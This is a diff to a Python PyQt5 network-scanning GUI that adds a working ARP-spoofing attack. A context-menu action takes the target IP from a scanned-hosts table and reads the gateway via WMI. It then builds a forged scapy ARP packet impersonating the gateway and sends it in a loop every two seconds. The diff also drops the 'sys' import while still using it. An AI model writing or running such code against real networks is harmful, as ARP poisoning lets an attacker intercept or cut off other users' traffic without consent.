@@ -1,9 +1,17 @@
-import sys
+import wmi
+from scapy.all import (
+    ARP,
+    Ether,
+    sendp,
+    getmacbyip,
+    get_if_hwaddr
+
+)
+import signal
 from PyQt5.QtWidgets import *
 from PyQt5.QtCore import *
 import pyperclip
-
-import attack
+from PyQt5.QtWidgets import QMessageBox,QApplication
 import ip
 from mac import IP2MAC
 import dname
@@ -15,7 +23,28 @@ ip_pre = '.'.join(args.split('.')[:-1])
 ip.find_ip(ip_pre)
 row_num = ip.live_ip
 
+def build_packet(TargetIp, GateWayAddr):
+        print("[-] Obtaining mac from {}".format(TargetIp))  # 打印信息
+        TargetMacAddr = None
+        while not TargetMacAddr:
+            TargetMacAddr = getmacbyip(TargetIp)  # 获得ipd的mac地址
+        MyMacAddr = get_if_hwaddr("WLAN")  # 获得我们网卡的mac地址
+        pkt = Ether(src=MyMacAddr, dst=TargetMacAddr) / ARP(hwsrc=MyMacAddr, psrc=GateWayAddr, hwdst=TargetMacAddr,
+                                                            pdst=TargetIp)
+        pkt.show()
+        print(pkt)
+        return pkt
 
+def stop(signal, frame):
+        sys.exit(0)
+
+
+class Thread(QThread):
+    def __init__(self):
+        super(Thread, self).__init__()
+    def run(self):
+        while True:
+            sendp(packet, inter=2, iface="WLAN")  # inter表示发送包的间隔,iface表示我们的网卡
 # row_num = 3
 class TableWidgetContextMenu(QWidget):
 
@@ -123,13 +152,52 @@ class TableWidgetContextMenu(QWidget):
                 elif action == item5:
                     print("a")
                 elif action == item6:
-                    import os
-                    #os.system('python attack.py')
-                    attack.ha(self.tableWidget.item(rowIndex, 1).text())
-                    #attack.getway(self.tableWidget.item(rowIndex, 1).text())
+                    TargetIp = self.tableWidget.item(rowIndex, 1).text()  # 我ipad联网之后分配的ip
+                    #自动获取当前网关
+                    wmi_obj = wmi.WMI()
+                    wmi_sql = "select DefaultIPGateway from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE"
+                    wmi_out = wmi_obj.query(wmi_sql)
+                    #产生攻击发送包
+                    for dev in wmi_out:
+                        gao = dev.DefaultIPGateway[0]
+                    GateWayAddr = gao  # 路由器地址/网关地址
+                    signal.signal(signal.SIGINT, stop)
+                    global packet
+                    packet = build_packet(TargetIp, GateWayAddr)
+                    #线程
+                    self.show_child()
+                    thread = Thread()
+                    thread.start()
+
             else:
                 return
 
+    def show_child(self):
+        self.child_window = Child()
+        self.child_window.show()
+
+class Child(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.initUI()
+
+    def initUI(self):
+        label = QLabel(self)
+        label.resize(200, 100)
+        label.setFrameStyle(QFrame.Panel | QFrame.Sunken)
+        label.setText("系统正在运行")
+        label.setAlignment(Qt.AlignBottom | Qt.AlignRight)
+        self.setGeometry(500, 500, 250, 250)
+        self.setWindowTitle('Processing')
+        self.show()
+
+    def closeEvent(self, event):
+        reply = QMessageBox.question(self, '警告', "是否回到原界面", QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
+
+        if reply == QMessageBox.Yes:
+            pass
+        else:
+            event.ignore()
 
 if __name__ == "__main__":
     app = QApplication(sys.argv)
